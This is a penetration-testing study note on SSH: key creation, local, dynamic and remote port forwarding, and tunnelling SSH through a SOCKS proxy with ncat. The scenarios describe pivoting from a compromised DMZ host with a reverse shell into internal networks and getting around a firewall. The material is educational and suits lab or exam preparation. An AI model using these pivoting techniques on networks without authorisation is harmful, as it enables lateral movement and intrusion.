> A network protocol that provides a secure and encrypted means of accessing and communicating with remote systems over an unsecured network


#Shell_Access #Remote_Access #SSH 

## SSH Key Creation

Create SSH key
```bash
ssh-keygen
```
- There are multiple types of default named ssh-keys: 
	- id_rsa
	- id_ecdsa
	- id_ecdsa_sk
	- id_ed25519
	- id_ed25519_sk
	- id_dsa
## SSH Usage

Using SSH 
```bash
ssh -p 32826 salesman@192.168.123.69
```

Set the permissions of SSH private key
```bash
chmod 400 ifoundthessh
```

Start SSH server on the Kali machine
```bash
sudo systemctl start ssh
```

Stop SSH server on the Kali machine
```bash
sudo systemctl stop ssh
```

#Port_Forwarding

## SSH Local Port Forwarding

Using SSH local port forwarding to access a specified remote service
```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 admin@10.4.50.215
```
- `-L`
	- Pass the local port forwarding argument
- `0.0.0.0:4455:172.16.50.217:445`
	- Listen on all interfaces on port `4455`
	- Specifying to forward to `172.16.50.217:445`
- `-N`
	- To prevent a shell from being opened.
- `admin@10.4.50.215`
	- Use SSH credentials to establish SSH connection
- Now connecting to port 4455 on the listener will now be just like connecting directly to port 445 on 172.16.50.217

- Scenario explained:
	- Network Setup:
		- WAN -> DMZ        -> INTERNAL
		- Kali   -> machine1 -> machine2 -> machine3
	- Got a reverse shell on machine1
		- machine1 can SSH to admin@machine2
	- Our Kali cannot SSH to admin@machine2 as it is internal
- Solution:
	- Create a port forward at machine1 using SSH to machine2 to allow Kali to talk to machine3 on port 445
		- `ssh -N -L 0.0.0.0:4455:machine3:445 admin@machine2`
			- Establishes an SSH connection to machine2 using the provided login credentials
			- Once the connection is established, any traffic sent to machine1 on port 4455 will be forwarded to machine3 on port 445 through the SSH tunnel.
			- This allows you to access resources on machine3 port 445 as if they were directly available on the local machine's port 4455.

## SSH Local Dynamic Port Forwarding

Using SSH local dynamic port forwarding to access any other port on any other host that jump host has access to, through this single port. Use Proxychains after.
```bash
ssh -N -D 0.0.0.0:9999 admin@10.4.50.215
```
- `-D`
	- dynamic port forward is created
	- Takes is the IP address and port we want to bind to. 
- `0.0.0.0:9999`
		- listen on all interfaces on port **9999**. 
		- We don't have to specify a socket address to forward to. 
- `-N` 
	- prevent a shell from being spawned
- `admin@10.4.50.215`
	- Use SSH credentials to establish SSH connection
- Edit proxychains configuration file with the dynamic port forward information
	- `socks5  192.168.202.63 9999`
- Using tools with proxychains will be forwarded out of admin@10.4.50.215

- Scenario explained:
	- Network Setup:
		- WAN -> DMZ        -> INTERNAL
		- Kali   -> machine1 -> machine2 -> machine3
	- Got a reverse shell on machine1
		- machine1 can SSH to admin@machine2
	- Our Kali cannot SSH to admin@machine2 as it is internal
- Solution:
	- Create a dynamic port forward at machine1 using SSH to machine2 to allow Kali to talk any hosts and ports that machine2 can talk to E.g., machine3
		- `ssh -N -D 0.0.0.0:9999 admin@machine2`
			- Sets up a dynamic port forwarding tunnel on machine1, binding it to all network interfaces on port 9999.
				- Allows you to use your local machine as a SOCKS proxy server.
					- Edit proxychains configuration file with the dynamic port forward information
						- `socks5  Machine1_IP 9999`
					- Any network traffic sent through this proxy server will be securely encrypted and forwarded to machine2.

## SSH Remote Port Forwarding
> SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. 
> Think of it like a reverse shell, but for port forwarding.

Using SSH remote port forwarding to access a specified remote service
```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
- `-R`
	- remote port forward option
- `127.0.0.1:2345`
	- listen on port 2345 on our Kali machine
- `10.4.50.215:5432`
	- forward all traffic to port 5432 on 10.4.50.215
- `kali@192.168.118.4`
	- Use local Kali SSH credentials to establish SSH connection
- Now connecting to port 2345 on localhost will now be just like connecting directly to port 5432 on 10.4.50.215

- Scenario explained:
	- Network Setup:
		- WAN -> Firewall -> DMZ        -> INTERNAL
		- Kali                     -> machine1 -> machine2 -> machine3
	- Got a reverse shell on machine1
		- machine1 can SSH to admin@machine2
	- Our Kali cannot SSH to admin@machine2 as it is internal
	- Firewall blocks us from connecting to any port other than HTTP on machine1
- Solution:
	- Set up an SSH server on our Kali machine
	- Connect from machine1 to our Kali machine over SSH. 
		- `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4`
			- Listen on port 2345 on our Kali machine (`127.0.0.1:2345`)
			- Forward all traffic to machine2 port 5432

## SSH Remote Dynamic Port Forwarding

Using SSH remote dynamic port forwarding to access any other port on any other host that jump host has access to, through this single port. Use Proxychains after.
```bash
ssh -N -R 9998 kali@192.168.118.4
```
- `-R 9998`
	- Bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine
- `-N` 
	- Prevent a shell from being opened
- `kali@192.168.118.4`
	- Use local Kali SSH credentials to establish SSH connection
- Edit proxychains configuration file with the dynamic port forward information
	- `socks5  127.0.0.1 9998`
- Using tools with proxychains will be forwarded out of the jumphost

- Scenario explained:
	- Network Setup:
		- WAN -> Firewall -> DMZ        -> INTERNAL
		- Kali                     -> machine1 -> machine2 -> machine3
	- Got a reverse shell on machine1
		- machine1 can SSH to admin@machine2
	- Our Kali cannot SSH to admin@machine2 as it is internal
	- Firewall blocks us from connecting to any port other than HTTP on machine1
- Solution:
	- Set up an SSH server on our Kali machine
	- Connect from machine1 to our Kali machine over SSH. 
		- `ssh -N -R 9998 kali@192.168.118.4`
			- Sets up a dynamic port forwarding tunnel on machine1, binding it to all network interfaces on port 9998 on the loopback interface of our Kali machine.
				- Allows you to use your local machine as a SOCKS proxy server.
					- Edit proxychains configuration file with the dynamic port forward information
						- `socks5  127.0.0.1 9998`
					- Any network traffic sent through this proxy server will be securely encrypted and forwarded to machine1.

## Run SSH itself through a SOCKS proxy
> SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the _ProxyCommand_ configuration option. We can either write this into a configuration file, or pass it as part of the command line with **-o**.
> 
> ProxyCommand accepts a shell command that is used to open a proxy-enabled channel. The documentation suggests using the _OpenBSD_ version of Netcat, which exposes the _-X_ flag and can connect to a SOCKS or HTTP proxy.

After Chisel client has created an HTTP WebSocket connection with the server, and SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine.

SSH by passing an Ncat command to ProxyCommand
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' db_superuser@10.10.69.169
```
- `-o` allows you to specify additional options for SSH. E.g., `ProxyCommand`
	- `ProxyCommand`
		- Used to define a command that will act as a proxy for the SSH connection.
- `ncat`
	- Utility that allows you to create and manage network connections. Used here as the proxy command.
- `--proxy-type socks5`
		- Specifies the type of proxy to use E.g., SOCKS5 proxy
- `--proxy 127.0.0.1:1080`
	- Specifies the address and port of the SOCKS proxy server, which is located at `127.0.0.1` (localhost) on port `1080`.
- `%h` and `%p` tokens represent the SSH command host and port values
	- SSH will fill in before running the command
		- In this case, 
			- `%h` will be replaced by `10.10.69.169`
			- `%p` will be replaced by the default SSH port (22).
